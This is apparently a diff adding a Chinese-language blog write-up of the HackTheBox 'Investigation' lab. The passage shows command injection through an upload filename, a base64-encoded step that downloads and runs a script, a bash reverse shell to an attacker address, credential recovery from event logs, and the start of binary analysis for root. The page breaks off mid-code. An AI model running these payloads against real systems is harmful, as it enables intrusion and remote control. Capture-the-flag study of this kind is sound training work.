@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="日常记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Investigation">
+<meta property="og:url" content="https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="日常记录">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-21T15:27:00.000Z">
+<meta property="article:modified_time" content="2023-03-21T15:38:46.018Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Investigation | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Investigation
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-21 23:27:00 / Modified: 23:38:46" itemprop="dateCreated datePublished" datetime="2023-03-21T23:27:00+08:00">2023-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>日常记录</p>
+<a id="more"></a>
+<h1 id="hackthebox_investigation"><a class="markdownIt-Anchor" href="#hackthebox_investigation"></a> HackTheBox_Investigation</h1>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.197</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.197</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 835 closed ports, 163 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41</span><br><span class="line">Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.197</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Tue, 21 Mar 2023 11:51:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">Location: http:&#x2F;&#x2F;eforenzics.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure>
+<p>添加域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.197\teforenzics.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>未枚举出有效路径</p>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>请求<code>http://eforenzics.htb/service.html</code></p>
+<p>上传文件功能位于<code>http://eforenzics.htb/upload.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>burpsuite中使用以下文件名进行RCE</p>
+<p><code>filename=&quot;|`curl 10.10.16.8?BFL`|&quot;</code></p>
+<p>本地httpserver接收到请求</p>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
+<p>反弹Shell语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br></pre></td></tr></table></figure>
+<p>使用以下格式的文件名进行反弹Shell</p>
+<p><code>filename=&quot;|`echo $BASE64_PAYLOAD | base64 -d`|&quot;</code></p>
+<p>Base64编码前的命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.*.*/BFL -o /tmp/BFL</span><br><span class="line">bash /tmp/BFL</span><br></pre></td></tr></table></figure>
+<p>接收到Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">smorton:x:1000:1000:eForenzics:&#x2F;home&#x2F;smorton:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">backup:x:34:34::&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:113:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+<p>查找与用户<code>smorton</code>相关的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user smorton -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;smorton</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure>
+<p>查看文件权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 smorton smorton 1308160 Oct  1 00:35 &#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure>
+<p>查看Web路径权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/www/html/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Jan  9 10:50 .</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Sep 30 22:26 ..</span><br><span class="line">drwxrwx--- 2 www-data www-data  4096 Mar 21 13:02 analysed_images</span><br><span class="line">dr-xr-x--- 7 www-data www-data  4096 Oct  1 00:31 assets</span><br><span class="line">-r-xr-x--- 1 www-data www-data 10957 Oct  1 00:31 index.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  4335 Oct  1 00:31 service.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  5193 Oct  1 00:31 upload.php</span><br></pre></td></tr></table></figure>
+<p>更改Web路径权限并将文件移动至Web路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/</span><br><span class="line">cp /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg /var/www/html/BFL.msg</span><br></pre></td></tr></table></figure>
+<p>下载文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/BFL.msg</span><br><span class="line">file BFL.msg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BFL.msg: CDFV2 Microsoft Outlook Message</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>apt-get install evolution<br />
+<a target="_blank" rel="noopener" href="https://www.zamzar.com/converters/document/msg/">https://www.zamzar.com/converters/document/msg/</a></p>
+</blockquote>
+<p>转换为pst格式文件并在evolution中打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hi Steve,</span><br><span class="line"></span><br><span class="line">Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I&#39;m concerned that they are moving data on to production without following our data transfer procedures. </span><br><span class="line"></span><br><span class="line">Regards.</span><br><span class="line">Tom</span><br></pre></td></tr></table></figure>
+<p>导出zip并解压后得到<code>security.evtx</code></p>
+<blockquote>
+<p>pip install python-evtx</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evtx_dump.py security.evtx &gt; sec.xml</span><br></pre></td></tr></table></figure>
+<p>查找以下内容</p>
+<p><code>&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;</code></p>
+<p>某个匹配结果附近找到字符串<code>Def@ultf0r3nz!csPa$$</code></p>
+<p>尝试登入SSH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh smorton@10.10.11.197</span><br><span class="line">Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure>
+<p>登入成功，查看user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/smorton/user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e98d3d1effe4d3e1d9e1dcb2574d7ac</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for smorton on investigation:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User smorton may run the following commands on investigation:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/binary</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-xr-xr-- 1 root root 19024 Jan  5 16:02 &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure>
+<p>在Web用户的Shell中更改Web路径权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www</span><br><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure>
+<p>移动文件至Web路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/binary /var/www/html/</span><br></pre></td></tr></table></figure>
+<p>获取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/binary</span><br></pre></td></tr></table></figure>
+<p>IDA中反编译的主函数如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *command; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(argv[<span class="number">2</span>], <span class="string">&quot;lDnxUysaQn&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Running... &quot;</span>);</span><br><span class="line">  stream = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  v5 = curl_easy_init();</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10002LL</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10001LL</span>, stream);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">45LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)curl_easy_perform(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v6 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(s, v6 + <span class="number">1</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  v7 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  command = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(command, v7 + <span class="number">1</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  